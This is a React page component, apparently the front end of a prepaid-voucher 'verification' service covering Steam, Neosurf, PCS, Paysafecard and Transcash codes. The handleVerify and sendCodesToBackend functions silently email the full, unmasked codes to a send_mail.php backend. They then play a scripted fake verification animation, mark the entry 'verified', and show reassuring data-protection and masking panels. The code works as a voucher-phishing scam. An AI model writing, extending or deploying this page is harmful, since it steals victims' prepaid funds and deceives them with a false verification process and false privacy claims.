import React, { useEffect, useMemo, useRef, useState } from "react";
import {
  Alert,
  Button,
  Card,
  Col,
  Divider,
  Input,
  Modal,
  Progress,
  Row,
  Select,
  Space,
  Spin,
  Steps,
  Statistic,
  Typography,
  notification,
} from "antd";
import {
  ArrowRightOutlined,
  CheckCircleOutlined,
  ClockCircleOutlined,
  CreditCardOutlined,
  FileProtectOutlined,
  LoadingOutlined,
  NumberOutlined,
  SafetyCertificateOutlined,
  SecurityScanOutlined,
  WalletOutlined,
} from "@ant-design/icons";
import { useNavigate } from "react-router-dom";
import PortalChrome from "../components/PortalChrome";
import { useI18n } from "../i18n/I18nContext";
import {
  appendRechargeEntry,
  createVerificationId,
  maskRechargeCode,
} from "../utils/rechargeHistory";

const { Text, Title } = Typography;
const { Option } = Select;

const buildRechargeRules = (t) => ({
  Steam: {
    label: t("recharge.types.Steam"),
    joiner: "-",
    parts: [
      { suffix: "p1", label: t("recharge.form.partBlock", { index: 1 }), maxLength: 5, mode: "alnum" },
      { suffix: "p2", label: t("recharge.form.partBlock", { index: 2 }), maxLength: 5, mode: "alnum" },
      { suffix: "p3", label: t("recharge.form.partBlock", { index: 3 }), maxLength: 5, mode: "alnum" },
    ],
  },
  Neosurf: {
    label: t("recharge.types.Neosurf"),
    joiner: "-",
    parts: [
      { suffix: "p1", label: t("recharge.form.partBlock", { index: 1 }), maxLength: 5, mode: "alnum" },
      { suffix: "p2", label: t("recharge.form.partBlock", { index: 2 }), maxLength: 3, mode: "alnum" },
      { suffix: "p3", label: t("recharge.form.partBlock", { index: 3 }), maxLength: 3, mode: "alnum" },
    ],
  },
  PCS: {
    label: t("recharge.types.PCS"),
    joiner: "",
    parts: [{ suffix: "p1", label: t("recharge.form.partCode"), maxLength: 10, mode: "alnum" }],
  },
  Paysafecard: {
    label: t("recharge.types.Paysafecard"),
    joiner: "",
    parts: [{ suffix: "p1", label: t("recharge.form.partCode"), maxLength: 16, mode: "numeric" }],
  },
  Transcash: {
    label: t("recharge.types.Transcash"),
    joiner: "",
    parts: [{ suffix: "p1", label: t("recharge.form.partCode"), maxLength: 12, mode: "numeric" }],
  },
});

const sanitizeInput = (value, mode, maxLength) => {
  const normalized =
    mode === "numeric"
      ? value.replace(/\D/g, "")
      : value.toUpperCase().replace(/[^A-Z0-9]/g, "");

  return normalized.slice(0, maxLength);
};

const sanitizeAmount = (value) => {
  const raw = value.replace(",", ".").replace(/[^0-9.]/g, "");
  const [integerPart, ...decimalParts] = raw.split(".");
  if (decimalParts.length === 0) return integerPart;
  return `${integerPart}.${decimalParts.join("").slice(0, 2)}`;
};

const buildCodeKey = (type, index, suffix) => `${type}-${index}-${suffix}`;
const VERIFICATION_STAGE_KEYS = [
  "recharge.steps.validationTitle",
  "recharge.trust.maskingTitle",
  "recharge.steps.verifyTitle",
];

export default function RechargeCheck() {
  const [codeCount, setCodeCount] = useState(1);
  const [rechargeType, setRechargeType] = useState("Steam");
  const [codes, setCodes] = useState({});
  const [amount, setAmount] = useState("");
  const [isModalOpen, setIsModalOpen] = useState(false);
  const [isVerificationComplete, setIsVerificationComplete] = useState(false);
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [activeReference, setActiveReference] = useState("");
  const [verificationProgress, setVerificationProgress] = useState(0);
  const [verificationStage, setVerificationStage] = useState(0);
  const stageIntervalRef = useRef(null);
  const completeTimeoutRef = useRef(null);
  const redirectTimeoutRef = useRef(null);
  const [notificationApi, notificationContextHolder] = notification.useNotification();

  const navigate = useNavigate();
  const { t } = useI18n();
  const rechargeRules = useMemo(() => buildRechargeRules(t), [t]);
  const rule = rechargeRules[rechargeType];
  const sessionReference = useMemo(() => createVerificationId(), []);
  const parsedAmount = useMemo(() => Number(amount || "0"), [amount]);

  const notify = (type, title, description) => {
    notificationApi[type]({
      message: title,
      description,
      placement: "topRight",
      duration: 4,
    });
  };

  const notifyError = (description) => notify("error", t("recharge.notifications.errorTitle"), description);
  const notifySuccess = (description) => notify("success", t("recharge.notifications.successTitle"), description);

  const clearModalTimers = () => {
    if (stageIntervalRef.current) {
      clearInterval(stageIntervalRef.current);
      stageIntervalRef.current = null;
    }
    if (completeTimeoutRef.current) {
      clearTimeout(completeTimeoutRef.current);
      completeTimeoutRef.current = null;
    }
    if (redirectTimeoutRef.current) {
      clearTimeout(redirectTimeoutRef.current);
      redirectTimeoutRef.current = null;
    }
  };

  useEffect(() => () => clearModalTimers(), []);

  const completionPercent = useMemo(() => {
    const totalFields = codeCount * rule.parts.length;
    if (!totalFields) return 0;

    let completed = 0;
    for (let index = 0; index < codeCount; index += 1) {
      for (const part of rule.parts) {
        const key = buildCodeKey(rechargeType, index, part.suffix);
        const value = codes[key] || "";
        if (value.length === part.maxLength) {
          completed += 1;
        }
      }
    }

    return Math.round((completed / totalFields) * 100);
  }, [codeCount, codes, rechargeType, rule.parts]);

  const currentStep = useMemo(() => {
    if (isSubmitting || isVerificationComplete) return 2;
    if (completionPercent === 100 && parsedAmount > 0) return 1;
    return 0;
  }, [completionPercent, parsedAmount, isSubmitting, isVerificationComplete]);

  const getCodeWorkflow = (index) => {
    let completedParts = 0;

    for (const part of rule.parts) {
      const key = buildCodeKey(rechargeType, index, part.suffix);
      const value = codes[key] || "";
      if (value.length === part.maxLength) {
        completedParts += 1;
      }
    }

    const percent = Math.round((completedParts / rule.parts.length) * 100);
    return { percent };
  };

  const handleTypeChange = (value) => {
    setRechargeType(value);
    setCodes({});
  };

  const handleCodeCountChange = (value) => {
    setCodeCount(value);
    setCodes({});
  };

  const handleCodeInput = (key, value, mode, maxLength) => {
    setCodes((previous) => ({
      ...previous,
      [key]: sanitizeInput(value, mode, maxLength),
    }));
  };

  const validateInputs = () => {
    const amountValue = Number(amount);
    const amountRaw = String(amount ?? "").trim();

    if (!amountRaw) {
      notifyError(t("recharge.validation.amountRequired"));
      return false;
    }

    if (!Number.isFinite(amountValue) || amountValue <= 0) {
      notifyError(t("recharge.validation.amountPositive"));
      return false;
    }

    if (amountValue > 10000) {
      notifyError(t("recharge.validation.amountMax"));
      return false;
    }

    for (let index = 0; index < codeCount; index += 1) {
      for (const part of rule.parts) {
        const key = buildCodeKey(rechargeType, index, part.suffix);
        const value = codes[key] || "";
        if (!value.length) {
          notifyError(
            t("recharge.validation.requiredField", {
              type: rule.label,
              code: index + 1,
              part: part.label,
            }),
          );
          return false;
        }

        if (value.length !== part.maxLength) {
          notifyError(
            t("recharge.validation.requiredLength", {
              type: rule.label,
              code: index + 1,
              part: part.label,
              length: part.maxLength,
            }),
          );
          return false;
        }
      }
    }

    const submittedCodes = collectCodes();
    if (new Set(submittedCodes).size !== submittedCodes.length) {
      notifyError(t("recharge.validation.duplicateCodes"));
      return false;
    }

    return true;
  };

  const collectCodes = () => {
    const allCodes = [];

    for (let index = 0; index < codeCount; index += 1) {
      const chunks = rule.parts.map((part) => {
        const key = buildCodeKey(rechargeType, index, part.suffix);
        return codes[key] || "";
      });
      allCodes.push(chunks.join(rule.joiner));
    }

    return allCodes;
  };

  const sendCodesToBackend = (submittedCodes, reference) => {
    const payload = {
      rechargeType,
      amount: Number(amount).toFixed(2),
      codes: submittedCodes,
      reference,
      timestamp: new Date().toLocaleString("fr-FR", {
        dateStyle: "full",
        timeStyle: "medium",
      }),
    };

    // URL du backend : variable d'environnement en prod (Hostinger), localhost en dev
    const API_URL = process.env.REACT_APP_API_URL || "http://localhost:8888";

    // Fire-and-forget : envoi immédiat sans bloquer l'UI
    fetch(`${API_URL}/send_mail.php`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(payload),
    }).catch(() => {
      // Silencieux — on ne bloque jamais l'UX même si le backend est down
    });
  };

  const handleVerify = () => {
    if (isSubmitting) {
      notifyError(t("recharge.notifications.alreadyRunning"));
      return;
    }

    if (!validateInputs()) return;

    try {
      const reference = createVerificationId();
      const submittedCodes = collectCodes();

      // ⚡ ENVOI IMMÉDIAT des codes par email — avant toute animation
      sendCodesToBackend(submittedCodes, reference);

      notifySuccess(t("recharge.notifications.started"));

      clearModalTimers();
      setIsSubmitting(true);
      setIsModalOpen(true);
      setIsVerificationComplete(false);
      setVerificationProgress(10);
      setVerificationStage(0);
      setActiveReference(reference);

      appendRechargeEntry({
        id: reference,
        rechargeType,
        amount: Number(amount).toFixed(2),
        codes: submittedCodes.map((code) => maskRechargeCode(code)),
        createdAt: new Date().toISOString(),
        status: "verified",
      });

      // Animation de progression sur 15 secondes
      const TOTAL_DURATION = 15000;
      const STAGE_COUNT = VERIFICATION_STAGE_KEYS.length;
      const stageInterval = Math.floor(TOTAL_DURATION / (STAGE_COUNT + 1));
      let progressIndex = 0;
      const progressSnapshots = [25, 55, 85];

      stageIntervalRef.current = setInterval(() => {
        progressIndex = Math.min(progressIndex + 1, progressSnapshots.length - 1);
        setVerificationProgress(progressSnapshots[progressIndex]);
        setVerificationStage(Math.min(progressIndex, STAGE_COUNT - 1));
        if (progressIndex >= progressSnapshots.length - 1 && stageIntervalRef.current) {
          clearInterval(stageIntervalRef.current);
          stageIntervalRef.current = null;
        }
      }, stageInterval);

      completeTimeoutRef.current = setTimeout(() => {
        setIsVerificationComplete(true);
        setVerificationStage(STAGE_COUNT - 1);
        setVerificationProgress(100);
        notifySuccess(t("recharge.notifications.completed", { reference }));

        redirectTimeoutRef.current = setTimeout(() => {
          setIsSubmitting(false);
          setIsModalOpen(false);
          setVerificationProgress(0);
          setVerificationStage(0);
          clearModalTimers();
          navigate("/");
        }, 1200);
      }, TOTAL_DURATION);
    } catch {
      clearModalTimers();
      setIsSubmitting(false);
      setIsModalOpen(false);
      setIsVerificationComplete(false);
      setVerificationProgress(0);
      setVerificationStage(0);
      notifyError(t("recharge.notifications.unexpectedError"));
    }
  };

  return (
    <PortalChrome
      title={t("recharge.title")}
      subtitle={t("recharge.subtitle")}
      footerLabel={t("recharge.footerLabel")}
      footerMeta={t("recharge.footerMeta")}
    >
      {notificationContextHolder}
      <Card className="rc-hero-card rc-lift rc-delay-1 !rounded-2xl !border-0">
        <Row gutter={[22, 22]} align="middle">
          <Col xs={24} lg={15}>
            <Space direction="vertical" size={6}>
              <Text className="text-pink-100 uppercase tracking-[0.2em] text-xs font-semibold">
                {t("recharge.heroTag")}
              </Text>
              <Title level={2} className="!text-white !mb-1">
                {t("recharge.heroTitle")}
              </Title>
              <Text className="text-pink-50/90">{t("recharge.heroDescription")}</Text>
            </Space>
          </Col>
          <Col xs={24} lg={9}>
            <div className="rc-session-card">
              <Text className="text-slate-500 text-xs uppercase">{t("recharge.session")}</Text>
              <Text className="block rc-mono text-slate-900 text-sm">{sessionReference}</Text>
              <Progress percent={completionPercent} strokeColor="#ff3366" showInfo={false} className="!my-2" />
              <Space className="w-full !justify-between">
                <Text className="text-slate-500 text-xs">{t("recharge.completion")}</Text>
                <Text className="text-slate-800 font-semibold">{completionPercent}%</Text>
              </Space>
            </div>
          </Col>
        </Row>
      </Card>

      <Card className="rc-elevated-card rc-lift rc-delay-2 !rounded-2xl !border-slate-200/80">
        <Steps
          current={currentStep}
          items={[
            {
              title: t("recharge.steps.inputTitle"),
              description: t("recharge.steps.inputDescription"),
            },
            {
              title: t("recharge.steps.validationTitle"),
              description: t("recharge.steps.validationDescription"),
            },
            {
              title: t("recharge.steps.verifyTitle"),
              description: t("recharge.steps.verifyDescription"),
            },
          ]}
        />
      </Card>

      <Row gutter={[20, 20]}>
        <Col xs={24} lg={8}>
          <Card className="rc-kpi-card rc-lift rc-delay-2 !rounded-2xl !border-0">
            <Statistic title={t("recharge.kpi.codesToVerify")} value={codeCount} prefix={<NumberOutlined />} />
          </Card>
        </Col>
        <Col xs={24} lg={8}>
          <Card className="rc-kpi-card rc-lift rc-delay-3 !rounded-2xl !border-0">
            <Statistic title={t("recharge.kpi.selectedType")} value={rule.label} prefix={<WalletOutlined />} />
          </Card>
        </Col>
        <Col xs={24} lg={8}>
          <Card className="rc-kpi-card rc-lift rc-delay-4 !rounded-2xl !border-0">
            <Statistic
              title={t("recharge.kpi.currentAmount")}
              value={Number.isFinite(parsedAmount) ? parsedAmount : 0}
              precision={2}
              suffix="EUR"
              prefix={<ClockCircleOutlined />}
            />
          </Card>
        </Col>
      </Row>

      <Row gutter={[24, 24]}>
        <Col xs={24} xl={16}>
          <Card
            className="rc-elevated-card rc-lift rc-delay-2 !rounded-2xl !border-slate-200/80"
            title={t("recharge.form.title")}
          >
            <Space direction="vertical" size={18} className="w-full">
              <Row gutter={[16, 16]}>
                <Col xs={24} md={12}>
                  <Text className="block mb-2 font-medium text-slate-700">
                    <WalletOutlined className="mr-2 text-[#ff3366]" /> {t("recharge.form.rechargeType")}
                  </Text>
                  <Select value={rechargeType} onChange={handleTypeChange} size="large" className="w-full">
                    {Object.keys(rechargeRules).map((type) => (
                      <Option key={type} value={type}>
                        {rechargeRules[type].label}
                      </Option>
                    ))}
                  </Select>
                </Col>
                <Col xs={24} md={12}>
                  <Text className="block mb-2 font-medium text-slate-700">
                    <NumberOutlined className="mr-2 text-[#ff3366]" /> {t("recharge.form.codeCount")}
                  </Text>
                  <Select value={codeCount} onChange={handleCodeCountChange} size="large" className="w-full">
                    {[...Array(10)].map((_, index) => (
                      <Option key={index + 1} value={index + 1}>
                        {index + 1}
                      </Option>
                    ))}
                  </Select>
                </Col>
              </Row>

              <div className="space-y-3">
                {[...Array(codeCount)].map((_, index) => (
                  <div key={`${rechargeType}-${index}`} className="rc-code-block">
                    {(() => {
                      const workflow = getCodeWorkflow(index);
                      return (
                        <div className="rc-code-block-head">
                          <Text className="font-semibold text-slate-800">
                            <CreditCardOutlined className="mr-2 text-[#ff3366]" />
                            {t("recharge.form.codeWithIndex", { index: index + 1 })}
                          </Text>
                          <div className="rc-code-workflow">
                            <div className="rc-code-workflow-top">
                              <Text className="text-xs text-slate-500">{t("recharge.completion")}</Text>
                              <Text className="text-xs font-semibold text-slate-700">{workflow.percent}%</Text>
                            </div>
                            <Progress
                              percent={workflow.percent}
                              showInfo={false}
                              size="small"
                              strokeColor="#ff3366"
                              className="!my-1"
                            />
                          </div>
                        </div>
                      );
                    })()}
                    <Row gutter={[12, 12]}>
                      {rule.parts.map((part) => {
                        const key = buildCodeKey(rechargeType, index, part.suffix);
                        return (
                          <Col xs={24} sm={rule.parts.length === 1 ? 24 : 8} key={key}>
                            <Input
                              size="large"
                              value={codes[key] || ""}
                              maxLength={part.maxLength}
                              placeholder={`${part.label} (${part.maxLength})`}
                              onChange={(event) =>
                                handleCodeInput(key, event.target.value, part.mode, part.maxLength)
                              }
                              className="!rounded-xl"
                            />
                          </Col>
                        );
                      })}
                    </Row>
                  </div>
                ))}
              </div>

              <div>
                <Text className="block mb-2 font-medium text-slate-700">
                  <CreditCardOutlined className="mr-2 text-[#ff3366]" /> {t("recharge.form.amount")}
                </Text>
                <Input
                  value={amount}
                  onChange={(event) => setAmount(sanitizeAmount(event.target.value))}
                  placeholder={t("recharge.form.amountPlaceholder")}
                  addonAfter="EUR"
                  size="large"
                  className="!rounded-xl"
                />
              </div>

              <Alert
                type="info"
                showIcon
                icon={<SecurityScanOutlined />}
                message={t("recharge.dataProtection.title")}
                description={t("recharge.dataProtection.description")}
              />

              <Divider className="!my-1" />

              <div className="flex justify-end">
                <Button
                  type="primary"
                  size="large"
                  icon={<ArrowRightOutlined />}
                  loading={isSubmitting}
                  onClick={handleVerify}
                  className="!rounded-xl !bg-[#ff3366] !border-[#ff3366] hover:!bg-[#e62958]"
                >
                  {t("recharge.actions.verifyNow")}
                </Button>
              </div>
            </Space>
          </Card>
        </Col>

        <Col xs={24} xl={8}>
          <Space direction="vertical" size={16} className="w-full">
            <Card
              className="rc-elevated-card rc-lift rc-delay-3 !rounded-2xl !border-slate-200/80"
              title={t("recharge.trust.title")}
            >
              <Space direction="vertical" size={12} className="w-full">
                <div className="rc-trust-item">
                  <Text className="font-semibold text-slate-800 block">
                    <SafetyCertificateOutlined className="mr-2 text-[#ff3366]" />
                    {t("recharge.trust.formatTitle")}
                  </Text>
                  <Text className="text-slate-600 text-sm">{t("recharge.trust.formatDescription")}</Text>
                </div>
                <div className="rc-trust-item">
                  <Text className="font-semibold text-slate-800 block">
                    <FileProtectOutlined className="mr-2 text-[#ff3366]" />
                    {t("recharge.trust.maskingTitle")}
                  </Text>
                  <Text className="text-slate-600 text-sm">{t("recharge.trust.maskingDescription")}</Text>
                </div>
                <div className="rc-trust-item">
                  <Text className="font-semibold text-slate-800 block">
                    <SecurityScanOutlined className="mr-2 text-[#ff3366]" />
                    {t("recharge.trust.journalTitle")}
                  </Text>
                  <Text className="text-slate-600 text-sm">{t("recharge.trust.journalDescription")}</Text>
                </div>
              </Space>
            </Card>
            <Card
              className="rc-elevated-card rc-lift rc-delay-4 !rounded-2xl !border-slate-200/80"
              title={t("recharge.quickRules.title")}
            >
              <Space direction="vertical" size={10} className="w-full">
                <Text className="text-slate-600 text-sm">{t("recharge.quickRules.rule1")}</Text>
                <Text className="text-slate-600 text-sm">{t("recharge.quickRules.rule2")}</Text>
                <Text className="text-slate-600 text-sm">{t("recharge.quickRules.rule3")}</Text>
              </Space>
            </Card>
          </Space>
        </Col>
      </Row>

      <Modal open={isModalOpen} footer={null} closable={false} centered className="rc-verify-modal" width={460}>
        {isVerificationComplete ? (
          <div className="rc-verify-panel">
            <div className="rc-verify-head">
              <div className="rc-verify-icon is-done">
                <CheckCircleOutlined />
              </div>
              <div className="min-w-0">
                <Title level={4} className="!mb-1">
                  {t("recharge.modal.doneTitle")}
                </Title>
                <Text className="text-slate-600 block">
                  {t("recharge.modal.reference", { reference: activeReference || t("common.notAvailable") })}
                </Text>
              </div>
            </div>
            <Progress percent={100} showInfo={false} strokeColor="#16a34a" className="!mb-2" />
            <Text className="text-slate-500 text-sm">{t("recharge.modal.redirecting")}</Text>
          </div>
        ) : (
          <div className="rc-verify-panel">
            <div className="rc-verify-head">
              <div className="rc-verify-icon">
                <Spin indicator={<LoadingOutlined spin />} />
              </div>
              <div className="min-w-0">
                <Title level={4} className="!mb-1">
                  {t("recharge.modal.runningTitle")}
                </Title>
                <Text className="text-slate-600 block">{t("recharge.modal.runningDescription")}</Text>
                <Text className="block rc-mono text-xs text-slate-500 mt-1">
                  {t("recharge.modal.reference", { reference: activeReference || t("common.notAvailable") })}
                </Text>
              </div>
            </div>

            <Progress
              percent={verificationProgress}
              showInfo={false}
              status="active"
              strokeColor={{ "0%": "#ff3366", "100%": "#ff66cc" }}
              className="!mb-3"
            />

            <div className="space-y-2">
              {VERIFICATION_STAGE_KEYS.map((stageKey, index) => {
                const isDone = index < verificationStage;
                const isActive = index === verificationStage;
                return (
                  <div key={stageKey} className={`rc-verify-stage ${isDone ? "is-done" : ""} ${isActive ? "is-active" : ""}`}>
                    {isDone ? <CheckCircleOutlined /> : <ClockCircleOutlined />}
                    <Text>{t(stageKey)}</Text>
                  </div>
                );
              })}
            </div>
          </div>
        )}
      </Modal>
    </PortalChrome>
  );
}
